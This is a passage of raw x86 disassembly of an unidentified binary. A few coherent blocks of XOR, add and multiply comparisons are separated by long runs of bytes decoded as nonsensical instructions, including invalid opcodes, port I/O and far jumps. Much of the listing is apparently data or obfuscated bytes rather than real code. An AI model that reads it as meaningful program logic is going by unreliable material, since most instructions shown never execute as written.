  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4337d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4337d7,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43381b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403a96
  403acb:	js     0x403ad5
  403acd:	jmp    0x7ebe4af2
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403b0d
  403ad7:	das    
  403ad8:	xchg   esp,eax
  403ad9:	gs push edx
  403adb:	cmp    BYTE PTR ds:[esi+eax*8-0x438bc647],ch
  403ae3:	fwait
  403ae4:	dec    esi
  403ae5:	pop    ss
  403ae6:	cmp    eax,0x600cfa4b
  403aeb:	lea    edi,[ecx]
  403aed:	add    DWORD PTR [ebx],0x8e7d40f2
  403af3:	scas   eax,DWORD PTR es:[edi]
  403af4:	fcmovbe st,st(2)
  403af6:	xchg   edi,eax
  403af7:	sbb    DWORD PTR [eax+0x60f85755],edx
  403afd:	ds (bad) 
  403aff:	lock (bad) 
  403b01:	call   0x854e9687
  403b06:	rcr    BYTE PTR [ecx+ebp*4-0x72645332],1
  403b0d:	mov    ecx,0xec4d3cf2
  403b12:	adc    eax,0xa500dbb3
  403b17:	rcl    BYTE PTR [esi],1
  403b19:	mov    al,ds:0x8ed3b566
  403b1e:	(bad)  
  403b20:	nop
  403b21:	mov    bh,0x25
  403b23:	popf   
  403b24:	sub    BYTE PTR [esi+0x67d86dda],ah
  403b2a:	out    0x1d,al
  403b2c:	and    ebp,DWORD PTR [ecx-0x1d]
  403b2f:	fstp   QWORD PTR [ecx+0x25a35da9]
  403b35:	ret    
  403b36:	push   es
  403b37:	add    BYTE PTR [esi+0x5],dh
  403b3a:	xchg   ecx,eax
  403b3b:	hlt    
  403b3c:	sub    BYTE PTR [ebp+0x54b42860],ah
  403b42:	in     eax,dx
  403b43:	jecxz  0x403b21
  403b45:	stos   DWORD PTR es:[edi],eax
  403b46:	mov    DWORD PTR [edx-0x6e],edx
  403b49:	in     eax,0x1d
  403b4b:	out    dx,eax
  403b4c:	bound  eax,QWORD PTR [esp+eax*8]
  403b4f:	dec    ebx
  403b50:	scas   eax,DWORD PTR es:[edi]
  403b51:	stc    
  403b52:	jae    0x403bc2
  403b54:	pop    esp
  403b55:	jle    0x403b02
  403b57:	pop    ds
  403b58:	and    eax,0xd61e4bd9
  403b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b5e:	push   ebp
  403b5f:	popf   
  403b60:	lods   al,BYTE PTR ds:[esi]
  403b61:	jmp    0x44ce0d81
  403b66:	ror    edi,0x45
  403b69:	xchg   esi,eax
  403b6a:	add    al,0x1b
  403b6c:	arpl   WORD PTR [eax-0x7],cx
  403b6f:	push   0x2e
  403b71:	ror    BYTE PTR [edi],cl
  403b73:	jno    0x403b24
  403b75:	int    0x3c
  403b77:	jge    0x403bda
  403b79:	jmp    0x403bcf
  403b7b:	xlat   BYTE PTR ds:[ebx]
  403b7c:	ror    edi,cl
  403b7e:	jbe    0x403bf4
  403b80:	repnz adc eax,0xd019a56a
  403b86:	std    
  403b87:	mov    ebp,DWORD PTR [eax]
  403b89:	jno    0x403baa
  403b8b:	repz xchg edi,eax
  403b8d:	add    dl,ah
  403b8f:	cmp    DWORD PTR [eax-0x6f],0xffffff8b
  403b93:	retf   
  403b94:	mov    edx,0x2a270a0d
  403b99:	dec    ebp
  403b9a:	sbb    eax,0xeb463521
  403b9f:	cs das 
  403ba1:	pop    eax
  403ba2:	shr    eax,0xbb
  403ba5:	push   ebp
  403ba6:	repz loopne 0x403b6d
  403ba9:	dec    eax
  403baa:	pop    es
  403bab:	sahf   
  403bac:	mov    ds:0x609b5,eax
  403bb1:	jae    0x403b8d
  403bb3:	xor    BYTE PTR [eax+edi*8],cl
  403bb6:	dec    esi
  403bb7:	lds    edx,FWORD PTR ds:0x5e4b0573
  403bbd:	cdq    
  403bbe:	retf   
  403bbf:	xor    DWORD PTR ds:0x8ad3856a,edx
  403bc5:	scas   eax,DWORD PTR es:[edi]
  403bc6:	int3   
  403bc7:	push   cs
  403bc8:	out    dx,eax
  403bc9:	or     ebx,DWORD PTR [esi]
  403bcb:	sub    al,bl
  403bcd:	mov    ah,0x5c
  403bcf:	dec    ecx
  403bd0:	mov    ch,0xb8
  403bd2:	(bad)
  403bd6:	push   edi
  403bd7:	int3   
  403bd8:	div    BYTE PTR [edi]
  403bda:	jl     0x403b91
  403bdc:	or     eax,0x7bb0297e
  403be1:	cmc    
  403be2:	aas    
  403be3:	jns    0x403c61
  403be5:	pusha  
  403be6:	arpl   WORD PTR [ecx-0x55],ax
  403be9:	std    
  403bea:	push   esp
  403beb:	mov    bl,BYTE PTR [eax-0x3164c9f8]
  403bf1:	mov    edx,0x5844c1c3
  403bf6:	adc    eax,0xabdf8f77
  403bfb:	mov    dh,0xb7
  403bfd:	mov    ch,BYTE PTR [ecx+0x16c24dbe]
  403c03:	icebp  
  403c04:	xchg   ecx,eax
  403c05:	lock lods eax,DWORD PTR ds:[esi]
  403c07:	fs leave 
  403c09:	sub    eax,0x2ba895dd
  403c0e:	xchg   edx,eax
  403c0f:	frndint 
  403c11:	pop    ds
  403c12:	dec    eax
  403c13:	neg    BYTE PTR [esi+0x664c367f]
  403c19:	xlat   BYTE PTR ds:[ebx]
  403c1a:	push   esi
  403c1b:	cmp    BYTE PTR [edx+0x131024ab],ch
  403c21:	mov    edi,0x1726784e
  403c26:	and    ch,BYTE PTR [edi]
  403c28:	ret    
  403c29:	out    0xf3,eax
  403c2b:	lahf   
  403c2c:	jle    0x403bbf
  403c2e:	not    BYTE PTR cs:[eax]
  403c31:	sar    BYTE PTR [ecx+0x40583cd6],1
  403c37:	cmp    esp,DWORD PTR [edx]
  403c39:	cmp    DWORD PTR [ebp+0x5c],eax
  403c3c:	inc    edi
  403c3d:	loopne 0x403c22
  403c3f:	int3   
  403c40:	mov    ebp,0xbecb6aa8
  403c45:	xchg   DWORD PTR [edi-0x4d],edx
  403c48:	xchg   esp,eax
  403c49:	adc    bh,bh
  403c4b:	jle    0x403c6a
  403c4d:	mov    al,ds:0xd63335b5
  403c52:	outs   dx,BYTE PTR ds:[esi]
  403c53:	mov    ch,0xf6
  403c55:	sbb    edi,ebp
  403c57:	enter  0xa63b,0xf1
  403c5b:	xor    edx,ecx
  403c5d:	fisub  WORD PTR [ecx-0xd90cf83]
  403c63:	mov    dl,0xe2
  403c65:	dec    edx
  403c66:	dec    edi
  403c67:	mov    esp,DWORD PTR [esi-0x6504a541]
  403c6d:	jmp    0x403ce7
  403c6f:	jbe    0x403c3e
  403c71:	cli    
  403c72:	sub    esi,esi
  403c74:	out    0xef,eax
  403c76:	das    
  403c77:	das    
  403c78:	mov    al,0x16
  403c7a:	inc    ecx
  403c7c:	mov    eax,0x48b532fa
  403c81:	xor    BYTE PTR [ebp+0x7426eff9],0x51
  403c88:	into   
  403c89:	cdq    
  403c8a:	pop    ecx
  403c8b:	add    DWORD PTR [ebp-0x602d1af8],ebp
  403c91:	adc    DWORD PTR [ecx-0x6c],esi
  403c94:	int3   
  403c95:	pop    esi
  403c96:	aas    
  403c97:	cmp    al,0x1c
  403c99:	arpl   WORD PTR [eax],si
  403c9b:	xchg   esi,eax
  403c9c:	sub    esp,DWORD PTR [eax-0xb317f28]
  403ca2:	add    dh,BYTE PTR [esi+edx*8-0x1892f709]
  403ca9:	shl    DWORD PTR ds:0x9ed85721,cl
  403caf:	xchg   dh,cl
  403cb1:	data16 fild DWORD PTR [ecx-0x41]
  403cb5:	mov    edi,0xd256c96b
  403cba:	mov    ah,0x67
  403cbc:	xor    eax,eax
  403cbe:	jle    0x403c88
  403cc0:	out    dx,al
  403cc1:	repz ds iret 
  403cc4:	jl     0x403cc7
  403cc6:	scas   eax,DWORD PTR es:[edi]
  403cc7:	add    cl,BYTE PTR [edi-0x6d]
  403cca:	hlt    
  403ccb:	push   esi
  403ccc:	lods   al,BYTE PTR ds:[esi]
  403ccd:	(bad)  
  403cce:	shl    BYTE PTR [ecx],1
  403cd0:	shrd   DWORD PTR [edi-0x175a3012],ecx,cl
  403cd7:	frstor [edx]
  403cd9:	lea    ebx,[eax-0x573dda45]
  403cdf:	test   al,0xe5
  403ce1:	push   ebp
  403ce2:	push   ss
  403ce3:	jb     0x403c91
  403ce5:	popf   
  403ce6:	mov    eax,0x11fc3b23
  403ceb:	xchg   esi,eax
  403cec:	ret    0xac7c
  403cef:	cli    
  403cf0:	jns    0x403d5f
  403cf2:	and    edx,DWORD PTR [edx]
  403cf4:	imul   esi,DWORD PTR cs:[edi+0x25],0xffffffe1
  403cf9:	mov    edx,0xd21fe23e
  403cfe:	cs adc dh,dl
  403d01:	arpl   sp,ax
  403d03:	stos   DWORD PTR es:[edi],eax
  403d04:	pop    es
  403d05:	mov    ebp,0x3f00c1d5
  403d0a:	out    0xe5,eax
  403d0c:	gs retf 
  403d0e:	pop    es
  403d0f:	jne    0x403cbf
  403d11:	lods   eax,DWORD PTR ds:[esi]
  403d12:	cmp    edi,eax
  403d14:	xchg   esi,eax
  403d15:	test   DWORD PTR [esi-0x6d],eax
  403d18:	test   eax,0xe8d2904f
  403d1d:	(bad)  
  403d1e:	mov    eax,ds:0x5a6063b
  403d23:	adc    esp,DWORD PTR [edi-0x33feb88a]
  403d29:	shl    edi,cl
  403d2b:	daa    
  403d2c:	xchg   ecx,eax
  403d2d:	sbb    al,0xce
  403d2f:	xor    ah,BYTE PTR ds:0x57778a04
  403d35:	enter  0xd4ff,0x60
  403d39:	sub    edx,DWORD PTR [eax]
  403d3b:	ret    0x8055
  403d3e:	adc    DWORD PTR [edi],ecx
  403d40:	iret   
  403d41:	daa    
  403d42:	dec    ebp
  403d43:	mov    ds:0xd1399e3a,eax
  403d48:	pop    ebp
  403d49:	pslld  mm3,QWORD PTR [eax+edi*2-0x5b6b9fc4]
  403d51:	inc    ebx
  403d52:	loopne 0x403d8f
  403d54:	push   0x473abf60
  403d59:	inc    esp
  403d5a:	xor    DWORD PTR [edi-0x66],edi
  403d5d:	ret    0x110f
  403d60:	sbb    DWORD PTR [esi+0x7971dcc0],edx
  403d66:	add    eax,0xde7c7fc7
  403d6b:	pop    ebp
  403d6c:	mov    eax,ds:0x744a6da5
  403d71:	sub    edi,ebp
  403d73:	(bad)  
  403d74:	addr16 stc 
  403d76:	jo     0x403d64
  403d78:	push   0xc9f863c2
  403d7d:	jg     0x403d7d
  403d7f:	inc    ecx
  403d80:	inc    ebx
  403d81:	mov    ah,0xeb
  403d83:	ja     0x403de8
  403d85:	xchg   cl,dh
  403d87:	cld    
  403d88:	xor    dl,BYTE PTR [edi+ebx*4+0x48d88189]
  403d8f:	add    eax,0x9953299b
  403d94:	ja     0x403df4
  403d96:	cmc    
  403d97:	mov    eax,ds:0x139e9bda
  403d9c:	xor    bl,BYTE PTR [edi]
  403d9e:	mov    bh,0x3b
  403da0:	mov    ebx,DWORD PTR [ebx-0x5c]
  403da3:	and    esi,esp
  403da5:	js     0x403d42
  403da7:	add    al,0xa
  403da9:	idiv   BYTE PTR [edx]
  403dab:	lahf   
  403dac:	cmp    edx,DWORD PTR [edx-0x26]
  403daf:	mov    ah,0x79
  403db1:	das    
  403db2:	or     DWORD PTR [eax-0x4a],0x79
  403db6:	aas    
  403db7:	neg    DWORD PTR [eax-0x74aea019]
  403dbd:	pop    ebp
  403dbe:	lock sub ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0x2f
  403e75:	pop    edi
  403e76:	inc    ebx
  403e77:	jmp    0x403e83
  403e79:	pop    ds
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e9d
  403e81:	cld    
  403e82:	inc    ebp
  403e83:	pop    es
  403e84:	xchg   DWORD PTR [edx+edi*2-0x42],edx
  403e88:	add    ch,BYTE PTR [ebx-0x16]
  403e8b:	pop    edx
  403e8c:	addr16 into 
  403e8e:	add    eax,0x580f6e
  403e93:	retf   0x6f3b
  403e96:	dec    ecx
  403e97:	lock ins DWORD PTR es:[edi],dx
  403e99:	cdq    
  403e9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e9b:	push   eax
  403e9c:	xchg   esp,eax
  403e9d:	push   esi
  403e9e:	dec    ebx
  403e9f:	sbb    eax,0xa5fcf422
  403ea4:	push   edi
  403ea5:	xchg   ecx,eax
  403ea6:	adc    edx,DWORD PTR [eax]
  403ea8:	jns    0x403eff
  403eaa:	test   al,0x99
  403eac:	mov    dh,0x1f
  403eae:	xchg   esi,eax
  403eaf:	imul   esi,ecx,0xa64bed76
  403eb5:	les    ecx,FWORD PTR [ecx+ebx*1]
  403eb8:	add    DWORD PTR ds:0x83b53503,esp
  403ebe:	push   0x53
  403ec0:	jbe    0x403f04
  403ec2:	fimul  WORD PTR [edi+0x74]
  403ec5:	mov    eax,0x4ffe9e38
  403eca:	mov    bl,0x48
  403ecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ecd:	xlat   BYTE PTR ds:[ebx]
  403ece:	and    eax,0x53ec874f
  403ed3:	retf   
  403ed4:	adc    BYTE PTR [ebx+eax*4],ah
  403ed7:	mov    esi,0xa5b9fbe6
  403edc:	sub    al,bh
  403ede:	jle    0x403f50
  403ee0:	daa    
  403ee1:	in     al,dx
  403ee2:	add    edx,edi
  403ee4:	or     al,bl
  403ee6:	gs cmp al,0xab
  403ee9:	jb     0x403ef5
  403eeb:	repz sbb BYTE PTR [eax+ecx*8+0x5640c665],al
  403ef3:	lahf   
  403ef4:	ficomp DWORD PTR [esi-0x70849270]
  403efa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403efb:	push   esp
  403efc:	jmp    FWORD PTR [eax-0x7b2154b3]
  403f02:	(bad)  
  403f03:	lods   al,BYTE PTR ds:[esi]
  403f04:	mov    ebx,0xd716641d
  403f09:	dec    ebx
  403f0a:	add    ch,BYTE PTR [edx]
  403f0c:	cmp    edi,DWORD PTR [eax+0x38]
  403f0f:	dec    esp
  403f10:	fisttp DWORD PTR [edi]
  403f12:	push   edx
  403f13:	(bad)  
  403f14:	icebp  
  403f15:	xchg   BYTE PTR [edx],dh
  403f17:	cwde   
  403f18:	push   ebx
  403f19:	dec    edi
  403f1a:	dec    edi
  403f1b:	scas   eax,DWORD PTR es:[edi]
  403f1c:	mov    ebx,0xa8535697
  403f21:	dec    edx
  403f22:	shl    bh,0xc9
  403f25:	add    DWORD PTR [edx-0x57500257],ebp
  403f2b:	dec    edi
  403f2c:	stc    
  403f2d:	sbb    edx,DWORD PTR [ecx]
  403f2f:	mov    esp,0x5790a5f2
  403f34:	fidivr WORD PTR [esi-0x15]
  403f37:	pop    ebx
  403f38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f39:	cwde   
  403f3a:	xchg   ebp,eax
  403f3b:	aam    0xf5
  403f3d:	cmp    al,0xd1
  403f3f:	adc    BYTE PTR [edi+0x622b6435],al
  403f45:	cli    
  403f46:	jb     0x403f8f
  403f48:	jne    0x403fb7
  403f4a:	out    0xdf,al
  403f4c:	xchg   BYTE PTR gs:[esi+eiz*4-0x1982fa94],ah
  403f54:	cmp    eax,0x9bae6e9
  403f59:	sub    esp,esi
  403f5b:	repz jnp 0x403ef2
  403f5e:	daa    
  403f5f:	cmp    BYTE PTR [eax],0x44
  403f62:	in     al,0xef
  403f64:	adc    al,0xe3
  403f66:	pop    ebx
  403f67:	sub    eax,0xf8a1d46a
  403f6c:	rcr    BYTE PTR [ebx+ecx*8-0x4ac51f66],cl
  403f73:	sub    cl,bh
  403f75:	out    dx,al
  403f76:	mov    al,BYTE PTR [edi+0xc]
  403f79:	mov    ebp,0x2943d54
  403f7e:	mov    ds:0xb4397ac6,al
  403f83:	cld    
  403f84:	ss (bad) 
  403f86:	jecxz  0x403f13
  403f88:	and    eax,0x2ce89c29
  403f8d:	cmp    ch,dh
  403f8f:	inc    ebx
  403f90:	xchg   DWORD PTR [ebx-0x3e],esi
  403f93:	sub    DWORD PTR [eax],ebp
  403f95:	mov    ch,0x64
  403f97:	cmp    edx,DWORD PTR [edx+0x1b2e4b37]
  403f9d:	sbb    BYTE PTR [eax-0x3ec3eef4],bl
  403fa3:	inc    ecx
  403fa4:	cs xor al,0x36
  403fa7:	fs mov dh,0x7b
  403faa:	outs   dx,BYTE PTR ds:[esi]
  403fab:	mov    DWORD PTR [eax-0x26],esi
  403fae:	push   esp
  403faf:	adc    edi,DWORD PTR [eax-0xf0df426]
  403fb5:	pop    ebx
  403fb6:	pop    edi
  403fb7:	inc    edi
  403fb8:	cmp    edx,eax
  403fba:	inc    ebx
  403fbb:	xor    BYTE PTR [eax],ah
  403fbd:	and    al,0xf
  403fbf:	jne    0x403ff5
  403fc1:	cwde   
  403fc2:	test   BYTE PTR [edx-0x23],bl
  403fc5:	sbb    ch,ah
  403fc7:	(bad)  
  403fc8:	mov    ds:0x96b23c1d,eax
  403fcd:	lods   al,BYTE PTR ds:[esi]
  403fce:	mov    esp,0x6f15d6be
  403fd3:	xchg   DWORD PTR [edi+ecx*8-0xf],esp
  403fd7:	pop    ds
  403fd8:	or     edx,ebp
  403fda:	mov    bh,0x2
  403fdc:	les    ecx,FWORD PTR [edi]
  403fde:	in     eax,0x8d
  403fe0:	xor    al,0xed
  403fe2:	mov    dh,0x94
  403fe4:	xor    eax,0x58469b82
  403fe9:	shrd   DWORD PTR [esi-0x1d],eax,cl
  403fed:	push   ecx
  403fee:	pop    es
  403fef:	stc    
  403ff0:	sub    DWORD PTR [edi-0x7e],esi
  403ff3:	nop
  403ff4:	enter  0x242b,0xf8
  403ff8:	sub    eax,esi
  403ffa:	popf   
  403ffb:	ss std 
  403ffd:	dec    eax
  403ffe:	add    eax,0x93f38284
  404003:	ret    0xa2ea
  404006:	sbb    esi,esp
  404008:	add    eax,0x533a0993
  40400d:	push   0x31d32c5d
  404012:	inc    edi
  404013:	xchg   esp,eax
  404014:	push   eax
  404015:	jnp    0x403faa
  404017:	out    dx,al
  404018:	lods   al,BYTE PTR ds:[esi]
  404019:	jno    0x404038
  40401b:	push   ebx
  40401c:	dec    ecx
  40401d:	gs jl  0x403fde
  404020:	and    bl,dl
  404022:	pop    edx
  404023:	add    DWORD PTR [edi-0x6a],0x4d
  404027:	lock dec esp
  404029:	mov    fs,WORD PTR [ebx+eax*4+0x116bea6e]
  404030:	cmp    BYTE PTR es:[edx-0x5c93433a],bl
  404037:	jmp    0x85ff4743
  40403c:	adc    BYTE PTR [eax+0x1ce1d846],bl
  404042:	out    dx,eax
  404043:	mov    ecx,0xa000de79
  404048:	mov    dl,0xa0
  40404a:	jecxz  0x404037
  40404c:	bound  ebx,QWORD PTR [eax]
  40404e:	imul   edx,DWORD PTR [ebp+0x78d4e7d2],0x17
  404055:	ret    0xe527
  404058:	pusha  
  404059:	sbb    ebp,DWORD PTR [ecx-0x7177bde2]
  40405f:	int    0xc7
  404061:	ret    
  404062:	aaa    
  404063:	fst    QWORD PTR [esi]
  404065:	pop    esp
  404066:	popf   
  404067:	push   ebp
  404068:	cmovge edx,ecx
  40406b:	add    BYTE PTR [esi-0x7c],0xca
  40406f:	jmp    0xfb418cfa
  404074:	mov    fs,edx
  404076:	jne    0x4040ed
  404078:	and    esp,DWORD PTR [ebx-0x34]
  40407b:	add    BYTE PTR [edi-0x54cf6ea7],ah
  404081:	xchg   edi,eax
  404082:	xor    eax,0x2104962d
  404087:	dec    ebp
  404088:	xchg   ebp,eax
  404089:	loope  0x4040fd
  40408b:	mov    esp,0x4054b0a3
  404090:	iret   
  404091:	mov    gs,ebp
  404093:	push   ss
  404094:	push   cs
  404095:	xchg   DWORD PTR [esi],esp
  404097:	xchg   DWORD PTR [edx],esp
  404099:	cmp    DWORD PTR [eax+0x33],ebp
  40409c:	stos   DWORD PTR es:[edi],eax
  40409d:	lods   eax,DWORD PTR ss:[esi]
  40409f:	imul   ebp,DWORD PTR [edx],0xffffffec
  4040a2:	bound  ebx,QWORD PTR [ecx+0x744c12d6]
  4040a8:	jecxz  0x404084
  4040aa:	xor    eax,0x53227ab5
  4040af:	(bad)  
  4040b0:	out    0xbd,eax
  4040b2:	fimul  DWORD PTR [edi+0x3600d4fe]
  4040b8:	jno    0x404101
  4040ba:	outs   dx,BYTE PTR ds:[esi]
  4040bb:	mov    esi,0x9e711f47
  4040c0:	add    cl,dh
  4040c2:	xchg   esi,eax
  4040c3:	cmp    eax,0x31de0286
  4040c8:	and    eax,0xcdbc5185
  4040cd:	lea    esi,[ecx+0x1d7d497d]
  4040d3:	mov    ch,0xb6
  4040d5:	cmc    
  4040d6:	fist   DWORD PTR [ebp-0x74]
  4040d9:	pop    es
  4040da:	xor    BYTE PTR [eax-0xc],bl
  4040dd:	pop    ss
  4040de:	cs push 0x66c21597
  4040e4:	int3   
  4040e5:	inc    eax
  4040e6:	cmc    
  4040e7:	jno    0x4040c4
  4040e9:	fist   DWORD PTR ds:0x6bfbe2f
  4040ef:	add    BYTE PTR [eax-0x4f],0xbb
  4040f3:	inc    ecx
  4040f4:	test   BYTE PTR [edx-0x7f95b2cc],dh
  4040fa:	pop    eax
  4040fb:	cli    
  4040fc:	(bad)  
  4040fd:	push   ecx
  4040fe:	inc    ebp
  4040ff:	retf   
  404100:	jp     0x404152
  404102:	repz pop ebp
  404104:	fisub  WORD PTR [edx-0x16]
  404107:	pop    ss
  404108:	push   es
  404109:	mov    dh,0x91
  40410b:	imul   edi,DWORD PTR ds:0xa4e05810,0x2515bf3d
  404115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404116:	xchg   edx,eax
  404117:	push   ecx
  404118:	and    BYTE PTR [edx],bl
  40411a:	sar    DWORD PTR [edi+0x7965c2a0],cl
  404120:	sbb    eax,0x28394855
  404125:	jmp    0x40410d
  404127:	ja     0x404172
  404129:	bound  edi,QWORD PTR [esi-0x52]
  40412c:	jbe    0x40415b
  40412e:	xchg   ebx,eax
  40412f:	sub    eax,0x3adcdc4b
  404134:	stos   BYTE PTR es:[edi],al
  404135:	push   0x27
  404137:	push   0xffffff91
  404139:	adc    BYTE PTR [edi+0x6e],bh
  40413c:	push   es
  40413d:	fisttp WORD PTR [eax-0x8f5fa73]
  404143:	pop    ecx
  404144:	fnstsw WORD PTR [ecx]
  404146:	pop    eax
  404147:	in     eax,0xf9
  404149:	test   eax,0x3fa05958
  40414e:	ret    
  40414f:	sar    BYTE PTR [edx+0x183578f7],cl
  404155:	sbb    DWORD PTR [ecx],esi
  404157:	loope  0x4041cb
  404159:	test   eax,0xef9e15b0
  40415e:	ret    
  40415f:	mov    eax,ds:0x7e07ed90
  404164:	or     DWORD PTR [eax+0x2b],eax
  404167:	fistp  QWORD PTR [ebx]
  404169:	fimul  DWORD PTR [ebx-0x79f037ab]
  40416f:	add    eax,DWORD PTR [eax]
  404171:	add    BYTE PTR [eax],al
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [edx],al
  40418b:	or     DWORD PTR ds:0x7e1d7457,edx
  404191:	jle    0x4041eb
  404193:	jl     0x404213
  404195:	jle    0x404176
  404197:	sbb    ah,BYTE PTR [edi]
  404199:	mov    WORD PTR [eax-0x200256b1],gs
  40419f:	out    dx,eax
  4041a0:	cmp    DWORD PTR [esi],ebp
  4041a2:	xchg   ecx,eax
  4041a3:	sub    BYTE PTR [ebp+0x56],0x34
  4041a7:	int3   
  4041a8:	mov    bl,0xe2
  4041aa:	or     eax,0x93f35a2b
  4041af:	mov    eax,0x7ef99bf7
  4041b4:	mov    esp,0xe201052e
  4041b9:	sbb    DWORD PTR [ebx],edx
  4041bb:	xchg   ebp,eax
  4041bc:	xchg   ebx,eax
  4041bd:	mov    DWORD PTR [ebx+0x3b61e944],esp
  4041c3:	mov    ebx,0xabe3fd66
  4041c8:	call   0xfe2f:0x1f9cf10f
  4041cf:	or     ebp,DWORD PTR [ebp-0x4a6dad88]
  4041d5:	or     edi,DWORD PTR [edx+0x5e]
  4041d8:	mov    edi,ecx
  4041da:	inc    esi
  4041db:	enter  0xe8cb,0xc
  4041df:	dec    ecx
  4041e0:	retf   
  4041e1:	xchg   ebx,eax
  4041e2:	xchg   ecx,eax
  4041e3:	mov    dh,0xef
  4041e5:	das    
  4041e6:	adc    DWORD PTR [edi],ebp
  4041e8:	in     eax,0xfc
  4041ea:	or     DWORD PTR [ecx],ebx
  4041ec:	(bad)  
  4041ed:	out    dx,al
  4041ee:	popa   
  4041ef:	addr16 pushf 
  4041f1:	mov    dh,0x4d
  4041f3:	aam    0x29
  4041f5:	(bad)  
  4041f7:	or     BYTE PTR [esi-0x56e72739],cl
  4041fd:	pushf  
  4041fe:	fistp  WORD PTR [esi-0x77]
  404201:	xor    al,0xb4
  404203:	cmp    BYTE PTR [edx],ah
  404205:	adc    BYTE PTR ds:0x45f05abb,0x2c
  40420c:	(bad)
  40420f:	dec    esi
  404210:	cdq    
  404211:	cmp    al,0x51
  404213:	xor    al,0x25
  404215:	aaa    
  404216:	cmp    al,ch
  404218:	jp     0x4041b6
  40421a:	ss mov ecx,0xc20e1853
  404220:	jmp    0x1cfc:0xdb7c4ca8
  404227:	and    BYTE PTR [edx-0x5fecd8f7],0xbe
  40422e:	pop    ecx
  40422f:	or     al,0x9b
  404231:	nop
  404232:	loop   0x404292
  404234:	iret   
  404235:	dec    esp
  404236:	inc    ebp
  404237:	inc    eax
  404238:	adc    DWORD PTR [esi+ebx*4+0x45cb0017],edi
  40423f:	js     0x40422c
  404241:	sti    
  404242:	xor    al,0x72
  404244:	jg     0x4041d7
  404246:	cwde   
  404247:	mov    al,al
  404249:	in     eax,dx
  40424a:	add    dh,BYTE PTR [edi-0x5b]
  40424d:	ins    BYTE PTR es:[edi],dx
  40424e:	out    0x71,eax
  404250:	test   eax,0x3420168c
  404255:	setp   al
